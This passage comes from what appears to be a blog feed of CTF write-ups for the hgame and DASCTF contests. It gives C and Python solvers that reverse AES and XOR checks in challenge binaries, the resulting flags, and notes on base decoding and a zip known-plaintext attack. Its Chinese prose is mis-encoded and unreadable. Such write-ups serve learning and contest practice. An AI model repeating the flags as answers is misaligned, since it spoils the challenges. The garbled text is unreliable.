class="number">3</span> &amp; <span class="number">1</span>) * xtime(xtime(xtime(x)))) ^</span><br><span class="line">       ((y&gt;&gt;<span class="number">4</span> &amp; <span class="number">1</span>) * xtime(xtime(xtime(xtime(x)))))); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InvMixColumns</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> a, b, c, d;</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123; </span><br><span class="line">    a = state[<span class="number">4</span>*i];</span><br><span class="line">    b = state[<span class="number">4</span>*i+<span class="number">1</span>];</span><br><span class="line">    c = state[<span class="number">4</span>*i+<span class="number">2</span>];</span><br><span class="line">    d = state[<span class="number">4</span>*i+<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    state[<span class="number">4</span>*i] = Multiply(a, <span class="number">0x0e</span>) ^ Multiply(b, <span class="number">0x0b</span>) ^ Multiply(c, <span class="number">0x0d</span>) ^ Multiply(d, <span class="number">0x09</span>);</span><br><span class="line">    state[<span class="number">4</span>*i+<span class="number">1</span>] = Multiply(a, <span class="number">0x09</span>) ^ Multiply(b, <span class="number">0x0e</span>) ^ Multiply(c, <span class="number">0x0b</span>) ^ Multiply(d, <span class="number">0x0d</span>);</span><br><span class="line">    state[<span class="number">4</span>*i+<span class="number">2</span>] = Multiply(a, <span class="number">0x0d</span>) ^ Multiply(b, <span class="number">0x09</span>) ^ Multiply(c, <span class="number">0x0e</span>) ^ Multiply(d, <span class="number">0x0b</span>);</span><br><span class="line">    state[<span class="number">4</span>*i+<span class="number">3</span>] = Multiply(a, <span class="number">0x0b</span>) ^ Multiply(b, <span class="number">0x0d</span>) ^ Multiply(c, <span class="number">0x09</span>) ^ Multiply(d, <span class="number">0x0e</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun_xor</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">unsigned</span> <span class="keyword">char</span> *enc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">enc[i] ^= key[k*<span class="number">16</span> + i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InvShift</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">1</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> s = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(s &lt; j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> tmp = a1[<span class="number">4</span>*<span class="number">3</span>+j];</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">3</span>; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">a1[<span class="number">4</span>*i+j] = a1[<span class="number">4</span>*(i<span class="number">-1</span>)+j];</span><br><span class="line">a1[j] = tmp;</span><br><span class="line">s++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InvSub</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">p[i] = rsbox[p[i]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[] = &#123;<span class="number">0x91</span>, <span class="number">0xb3</span>, <span class="number">0xc1</span>, <span class="number">0xeb</span>, <span class="number">0x14</span>, <span class="number">0x5d</span>, <span class="number">0xd5</span>, <span class="number">0xce</span>, <span class="number">0x3a</span>, <span class="number">0x1d</span>, <span class="number">0x30</span>, <span class="number">0xe4</span>, <span class="number">0x70</span>, <span class="number">0x6c</span>, <span class="number">0x6b</span>, <span class="number">0xd7</span>, <span class="number">0x69</span>, <span class="number">0x78</span>, <span class="number">0x79</span>, <span class="number">0x02</span>, <span class="number">0xa3</span>, <span class="number">0xa5</span>, <span class="number">0xdf</span>, <span class="number">0x1b</span>, <span class="number">0xfd</span>, <span class="number">0x1c</span>, <span class="number">0x02</span>, <span class="number">0x89</span>, <span class="number">0x14</span>, <span class="number">0x20</span>, <span class="number">0x7a</span>, <span class="number">0xfd</span>, <span class="number">0x24</span>, <span class="number">0x52</span>, <span class="number">0xf8</span>, <span class="number">0xa9</span>, <span class="number">0xf9</span>, <span class="number">0xf1</span>, <span class="number">0x6b</span>, <span class="number">0x1c</span>, <span class="number">0x0f</span>, <span class="number">0x5d</span>, <span class="number">0x50</span>, <span class="number">0x5b</span>, <span class="number">0xec</span>, <span class="number">0x42</span>, <span class="number">0xd1</span>, <span class="number">0x8c</span>, <span class="number">0xb8</span>, <span class="number">0x12</span>, <span class="number">0xcf</span>, <span class="number">0x2c</span>, <span class="number">0xa9</span>, <span class="number">0x69</span>, <span class="number">0x31</span>, <span class="number">0x46</span>, <span class="number">0xfd</span>, <span class="number">0x9b</span>, <span class="number">0xea</span>, <span class="number">0xde</span>, <span class="number">0xc8</span>, <span class="number">0xbf</span>, <span class="number">0x94</span>, <span class="number">0x69</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *p = a+<span class="number">48</span>, *p1;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> iv[] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">fun_xor(<span class="number">0xe</span>, p);</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">13</span>; ; j--)</span><br><span class="line">&#123;</span><br><span class="line">InvShift(p);</span><br><span class="line">InvSub(p);</span><br><span class="line">fun_xor(j, p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(j == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">InvMixColumns(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i != <span class="number">3</span>)</span><br><span class="line">p1 = p<span class="number">-16</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">p1 = iv;</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++)</span><br><span class="line">&#123;</span><br><span class="line">p[k] ^= p1[k];</span><br><span class="line">&#125;</span><br><span class="line">p = p1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, a[i]);</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//hgame&#123;cOsm0s_is_still_fight1ng_and_NEVER_GIVE_UP_O0o0o0oO00o00o&#125;</span></span><br></pre></td></tr></table></figure><p>å…¶å®å†™å¥½é€†è¿‡ç¨‹åï¼Œå¼€å§‹ä¸€ç›´è§£ä¸æ¥ï¼Œåé¢ä¸€ä¸ªä¸€ä¸ªæ’æŸ¥å†å‘ç°æ˜¯å¯†æ–‡æ‰¾é”™äº†ï¼Œ<strong>å†æ¬¡è¢«ä»idaçš„ä¼ªä»£ç æ¥çœ‹å˜é‡çš„å€¼å‘åˆ°</strong>ã€‚ã€‚ã€‚</p><p><strong>å¦å¤–è¿™ä¸ªaesåŠ å¯†å¹¶æ²¡æœ‰é­”æ”¹çš„ï¼Œåé¢æˆ‘åˆç”¨pythonçš„aesæ¨¡å—è§£äº†ä¸€ä¸‹ï¼ŒåŒæ ·è§£å‡ºã€‚ã€‚é‚£ç°åœ¨é—®é¢˜å°±æ˜¯ç§»ä½å’Œæ··åˆçš„æ–¹å‘çš„é—®é¢˜ï¼ˆè¿™é‡Œå…ˆç•™ä¸€ä¸‹ï¼‰ï¼Œåé¢å†å¥½å¥½å­¦ä¹ ä¸€ä¸‹ã€‚è‡³äºå—é•¿åº¦å’Œå¯†é’¥é•¿åº¦æ˜¯æ²¡å…³ç³»çš„ã€‚</strong></p><p>æœ€åå°±æ€»ç»“ä¸€ä¸‹aesåŠ å¯†çš„å¤§æ¦‚ï¼š</p><blockquote><ol><li><strong>é‡å¤è½®ï¼š128ä½å¯†é’¥ä¸€èˆ¬é‡å¤æ‰§è¡Œ9æ¬¡ï¼Œ192ä½å¯†é’¥ä¸€èˆ¬é‡å¤æ‰§è¡Œ11æ¬¡ï¼Œ256ä½å¯†é’¥ä¸€èˆ¬é‡å¤æ‰§è¡Œ13æ¬¡ã€‚</strong></li><li><strong>é‡å¤è½®æ¯è½®é‡å¤çš„æ“ä½œåŒ…æ‹¬ï¼šå­—èŠ‚æ›¿æ¢ã€è¡Œç§»ä½ã€åˆ—æ··ä¹±ã€è½®å¯†é’¥åŠ ã€‚</strong></li><li><strong>åœ¨aesä¸­å—é•¿åº¦ä¸éƒ½æ˜¯128ä½ï¼Œä¸å¯†é’¥é•¿åº¦æ— å…³ã€‚</strong></li><li><strong>æ¯æ‰§è¡Œä¸€å—çš„åŠ å¯†æ“ä½œï¼Œå¼€å§‹æ˜¯ä¸€ä¸ªåˆå§‹è½®ï¼ˆä¸åˆå§‹å¯†é’¥å¼‚æˆ–ï¼‰ï¼Œç„¶åé‡å¤è½®ï¼Œæœ€åä¸€ä¸ªæœ€ç»ˆè½®ï¼ˆé™¤å¼€åˆ—æ··æ··åˆæ“ä½œï¼‰ã€‚</strong></li></ol></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Baseå…¨å®¶ç¦"><a href="#Baseå…¨å®¶ç¦" class="headerlink" title="Baseå…¨å®¶ç¦"></a>Baseå…¨å®¶ç¦</h3><p>ä»æ¯ä¸€æ­¥éª¤åçš„å­—ç¬¦ç»„æˆå¯ä»¥å®¹æ˜“è¾¨è®¤å‡ºæ¥ã€‚</p><p>base64ï¼Œbase32ï¼Œbase16</p><h3 id="ä¸èµ·çœ¼å‹ç¼©åŒ…çš„å…»æˆçš„æ–¹æ³•"><a href="#ä¸èµ·çœ¼å‹ç¼©åŒ…çš„å…»æˆçš„æ–¹æ³•" class="headerlink" title="ä¸èµ·çœ¼å‹ç¼©åŒ…çš„å…»æˆçš„æ–¹æ³•"></a>ä¸èµ·çœ¼å‹ç¼©åŒ…çš„å…»æˆçš„æ–¹æ³•</h3><p>ä»å›¾ç‰‡æœ€åçœ‹åˆ°ä¸€ä¸ªå‹ç¼©åŒ…å’Œæç¤ºå¯†ç æ˜¯å›¾ç‰‡idã€‚</p><p><a href="https://saucenao.com/" target="_blank" rel="noopener">https://saucenao.com/</a> ä¸Šè¿™ä¸ªç½‘ç«™æŸ¥è¯¥å›¾ç‰‡çš„idã€‚</p><p>è§£å‹åå¾—åˆ°plain.zipå’ŒNO PASSWORD.txtï¼Œè€Œplain.zipåˆè¦å¯†ç ï¼Œçœ‹äº†ä¸€ä¸‹é‡Œé¢çš„æ–‡ä»¶ï¼Œå‘ç°ä¹Ÿæœ‰ä¸€ä¸ªNO PASSWORD.txtæ–‡ä»¶ï¼Œå®ƒä»¬crc32å€¼ã€‚</p><p>è¿™ç”±æ­¤æƒ³åˆ°åº”è¯¥æ˜¯æ˜æ–‡æ”»å‡»äº†ï¼Œè€Œæ˜æ–‡æ”»å‡»æœ‰ä¸€ä¸ªæ¡ä»¶ï¼Œ2ä¸ªæ–‡ä»¶çš„å‹ç¼©æ–¹å¼è¦ç›¸åŒï¼Œè¿™åœ¨NO PASSWORD.txtä¸­æœ‰æç¤ºã€‚</p><p><img src="https://i.loli.net/2021/02/27/GRqjEDtQSy2rYsb.png" alt="image-20210204222714426"></p><p>æ˜æ–‡æ”»å‡»å¾—åˆ°å¯†ç ï¼š</p><p><img src="https://i.loli.net/2021/02/27/oYBRAm6M51IbNpl.png" alt="image-20210204222741818"></p><p>æœ€åæ‰“å¼€flagæ–‡ä»¶ï¼Œæ˜¯å®ä½“ç¼–ç  entity codeï¼Œç”¨htmlå†™å¤„ä¸€ä¸ªæ ‡é¢˜è®©æµè§ˆå™¨è§£æå®ƒã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&amp;#x68;&amp;#x67;&amp;#x61;&amp;#x6D;&amp;#x65;&amp;#x7B;&amp;#x32;&amp;#x49;&amp;#x50;&amp;#x5F;&amp;#x69;&amp;#x73;&amp;#x5F;&amp;#x55;&amp;#x73;&amp;#x65;&amp;#x66;&amp;#x75;&amp;#x31;&amp;#x5F;&amp;#x61;&amp;#x6E;&amp;#x64;&amp;#x5F;&amp;#x4D;&amp;#x65;&amp;#x39;&amp;#x75;&amp;#x6D;&amp;#x69;&amp;#x5F;&amp;#x69;&amp;#x35;&amp;#x5F;&amp;#x57;&amp;#x30;&amp;#x72;&amp;#x31;&amp;#x64;&amp;#x7D;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/27/PXbVClN4UeKqJwj.png" alt="image-20210204223003807"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä¸€ä¸ªæœˆhgameç»“æŸäº†ï¼Œåšå®Œäº†é€†å‘é¢˜ï¼Œæ”¶è·å¾ˆå¤§ï¼Œmiscçš„ç­¾åˆ°é¢˜åšæ¥ç©äº†ä¸€ä¸‹ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>2021ä¸€æœˆDASCTFæš¨HWSç¡¬ä»¶å†¬ä»¤è¥é€‰æ‹”èµ›</title>
    <link href="https://www.bxnop.cn/2021/02/01/2021%E4%B8%80%E6%9C%88DASCTF%E6%9A%A8HWS%E7%A1%AC%E4%BB%B6%E5%86%AC%E4%BB%A4%E8%90%A5%E9%80%89%E6%8B%94%E8%B5%9B/"/>
    <id>https://www.bxnop.cn/2021/02/01/2021%E4%B8%80%E6%9C%88DASCTF%E6%9A%A8HWS%E7%A1%AC%E4%BB%B6%E5%86%AC%E4%BB%A4%E8%90%A5%E9%80%89%E6%8B%94%E8%B5%9B/</id>
    <published>2021-02-01T13:16:51.000Z</published>
    <updated>2021-02-04T03:41:12.752Z</updated>
    
    <content type="html"><![CDATA[<p>äºŒè¿›åˆ¶ä¸“åœºï¼ŒReverseåšå®Œäº†ï¼Œå†…æ ¸å®‰å…¨åšäº†1ä¸ªï¼Œå›ºä»¶å®‰å…¨åšäº†3ä¸ªã€‚æ€»çš„æ¥è¯´é¢˜ç›®éš¾åº¦ä¸æ˜¯å¾ˆå¤§ï¼Œä½†è€ƒç‚¹è¿˜è¡Œã€‚æ’åç¬¬ä¸€ï¼Œä¸ªäººåšäº†1820åˆ†ï¼Œå…¶ä¸­pwnæ˜¯i0ganåšçš„ã€‚<a id="more"></a></p><p><img src="https://i.loli.net/2021/02/03/QS2rJ9EkmviR5Xy.png" alt="image-20210201212702456"></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="decryption"><a href="#decryption" class="headerlink" title="decryption"></a>decryption</h3><p>æ‹¿äº†äºŒè¡€ã€‚é€†å‘æ–¹å‘çš„ç­¾åˆ°é¢˜ï¼Œç›´æ¥ç©·ä¸¾ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">18</span>,  <span class="number">69</span>,  <span class="number">16</span>,  <span class="number">71</span>,  <span class="number">25</span>,  <span class="number">73</span>,  <span class="number">73</span>,  <span class="number">73</span>,  <span class="number">26</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">28</span>,  <span class="number">30</span>,  <span class="number">82</span>, <span class="number">102</span>,  <span class="number">29</span>,  <span class="number">82</span>, <span class="number">102</span>, <span class="number">103</span>, <span class="number">104</span>, <span class="number">103</span>, </span><br><span class="line">  <span class="number">101</span>, <span class="number">111</span>,  <span class="number">95</span>,  <span class="number">89</span>,  <span class="number">88</span>,  <span class="number">94</span>, <span class="number">109</span>, <span class="number">112</span>, <span class="number">161</span>, <span class="number">110</span>, </span><br><span class="line">  <span class="number">112</span>, <span class="number">163</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> v3;</span><br><span class="line"><span class="keyword">int</span> v5 = j;</span><br><span class="line"><span class="keyword">int</span> v4 = i;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v3 = <span class="number">2</span> * (v4 &amp; v5);</span><br><span class="line">v5 ^= v4;</span><br><span class="line">v4 = v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v3 );</span><br><span class="line"><span class="keyword">if</span>((v5 ^ <span class="number">0x23</span>) == enc[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">putchar</span>(j);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="obfu"><a href="#obfu" class="headerlink" title="obfu"></a>obfu</h3><p>è¿™ä¸ªé¢˜ï¼Œè¢«ä»ä¼ªä»£ç æ¥è¾¨è¯†å˜é‡çš„å€¼å‘åˆ°äº†ï¼Œè¿˜æ˜¯è¦ä»æ±‡ç¼–ä»£ç æ¥çœ‹é è°±ã€‚</p><p>é¦–å…ˆé¢˜ç›®æœ‰ä¸€ä¸ªæ··æ·†ï¼Œä½†å¾ˆç®€å•ï¼Œpatchæ‰æ–¹ä¾¿ç‚¹ï¼Œä½†ä¸patchä¹Ÿä¸å½±å“ã€‚</p><p><img src="https://i.loli.net/2021/02/03/WlwNj2E3zCGAt6u.png" alt="image-20210201220900210"></p><p>è·Ÿäº†æŒºä¹…çš„åŠ å¯†è¿‡ç¨‹ï¼Œå¼‚æˆ–æ¯”è¾ƒå¤šï¼Œç„¶åå‡†å¤‡é€†å‘çš„æ—¶å€™å‘ç°ï¼ŒAESçš„ç‰¹å¾å•Šã€‚å¼€å§‹ä»¥ä¸ºæ˜¯å¸¸è§„çš„aesçš„è§£å¯†ï¼Œä½†å…¶å®ä¸ç„¶ï¼ŒåŠ ä¸Šé¢˜ç›®å‡ æ¬¡å¼‚æˆ–å¯¹ä¸ç†Ÿæ‚‰aesåŠ å¯†æ¥è¯´è¿·æƒ‘æ€§æŒºå¤§çš„ã€‚</p><p>è¿™æ ·åœ¨è¿™äº›åŠ å¯†å‡½æ•°å¾˜å¾Šäº†å¾ˆä¹…ï¼Œä¸æ¸…æ¥šè¿™ä¸ªaesåˆ°åº•è¦åšä»€ä¹ˆã€‚</p><p>æœ€åçœ‹äº†çœ‹å¦‚æœæˆ‘ä»¬è¾“å…¥æ­£ç¡®åè¦æ‰§è¡Œçš„å‡½æ•°ï¼Œè”æƒ³è¾“å…¥ï¼ŒåŠ ä¸Šè¿™é‡Œå‡½æ•°å°‘ï¼Œè¯†åˆ«èµ·æ¥ç›¸å¯¹å®¹æ˜“äº›ï¼Œå‘ç°å°±æ˜¯ä½¿ç”¨æˆ‘ä»¬è¾“å…¥å½“ä½œkeyæŠŠå¯†æ–‡è¿›è¡ŒAESè§£å¯†ã€‚ä¸ç¡®å®šçš„è¯è¿˜å¯ä»¥è‡ªå·±ç”¨æ•°æ®æ‰§è¡Œè¿™é‡Œçš„å‡½æ•°æ¥æµ‹è¯•ä¸€ä¸‹ã€‚</p><p>ç”±äºè¿™é‡Œçš„å‡½æ•°å·²ç»ç¡®å®šåŠŸèƒ½äº†ï¼Œçœ‹çœ‹å®ƒä»¬æœ‰æ²¡æœ‰åœ¨å‰é¢å¼•ç”¨è¿‡ï¼Œæœç„¶æœ‰çš„ã€‚è¿™æ ·å°±å¯¹æˆ‘ä»¬åˆ†æå‰é¢èµ·åˆ°äº†å¾ˆå¤§çš„å¸®åŠ©äº†ã€‚</p><p><img src="https://i.loli.net/2021/02/03/za8Ascqm9CWSEow.png" alt="image-20210201223206546"></p><p>è¿™æ ·åï¼Œå†ç»§ç»­å›åˆ°å‰é¢åˆ†æï¼Œæ€»ç»“ä¸€ä¸‹æµç¨‹ï¼š</p><p><img src="https://i.loli.net/2021/02/03/E1IKJlr5nMNxhU6.png" alt="image-20210201222517573"></p><p>è§£å¯†è¿‡ç¨‹ï¼š</p><p>æŠŠå¯†æ–‡å…ˆå¼‚æˆ–ä¸€ä¸‹ï¼Œç„¶åè¿›è¡ŒaesåŠ å¯†ï¼Œå…¶å®æ˜¯æ˜¯å¤šäº†ä¸ªivçš„CBCæ¨¡å¼çš„AESåŠ å¯†ï¼Œä½†è¿™é‡Œåªæœ‰ä¸€ç»„ã€‚æ‰€ä»¥æˆ‘ç›´æ¥ECBæ¨¡å¼åŠ å¯†è‡ªå·±å†å¼‚æˆ–ä¸€ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AesEncry</span><span class="params">(object)</span>:</span></span><br><span class="line">    key = <span class="string">'8ce51f9350f44511a854e1b5f0a3fbca'</span></span><br><span class="line">    key = bytes.fromhex(key)                     </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        mode = AES.MODE_ECB</span><br><span class="line">        padding = <span class="keyword">lambda</span> s: s + (<span class="number">16</span> - len(s) % <span class="number">16</span>) * chr(<span class="number">16</span> - len(s) % <span class="number">16</span>)</span><br><span class="line">        cryptos = AES.new(self.key, mode)</span><br><span class="line">        cipher_text = cryptos.encrypt(data)</span><br><span class="line">        <span class="keyword">return</span> cipher_text.hex()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        cryptos = AES.new(self.key, AES.MODE_ECB)</span><br><span class="line">        decrpytBytes = base64.b64decode(data)</span><br><span class="line">        meg = cryptos.decrypt(decrpytBytes).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">return</span> meg.encode()</span><br><span class="line"></span><br><span class="line">plaint = <span class="string">'4ff5e148c1d81254533e3a4bd47cfe72'</span></span><br><span class="line">plaint = bytes.fromhex(plaint)</span><br><span class="line">a = AesEncry().encrypt(plaint)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>å„ç§å¼‚æˆ–æ“ä½œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> op1[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">198</span>, <span class="number">6</span>, <span class="number">38</span>, <span class="number">70</span>, <span class="number">102</span>, <span class="number">134</span>, <span class="number">166</span>, <span class="number">198</span>, <span class="number">231</span>, <span class="number">7</span>, </span><br><span class="line">  <span class="number">38</span>, <span class="number">38</span>, <span class="number">70</span>, <span class="number">102</span>, <span class="number">134</span>, <span class="number">166</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> op2[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">42</span>, <span class="number">253</span>, <span class="number">103</span>, <span class="number">31</span>, <span class="number">159</span>, <span class="number">97</span>, <span class="number">45</span>, <span class="number">212</span>, <span class="number">252</span>, <span class="number">56</span>, </span><br><span class="line">  <span class="number">118</span>, <span class="number">164</span>, <span class="number">182</span>, <span class="number">197</span>, <span class="number">194</span>, <span class="number">141</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> mem[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">33</span>, <span class="number">35</span>, <span class="number">47</span>, <span class="number">41</span>, <span class="number">122</span>, <span class="number">87</span>, <span class="number">165</span>, <span class="number">167</span>, <span class="number">67</span>, <span class="number">137</span>, </span><br><span class="line">  <span class="number">74</span>, <span class="number">14</span>, <span class="number">74</span>, <span class="number">128</span>, <span 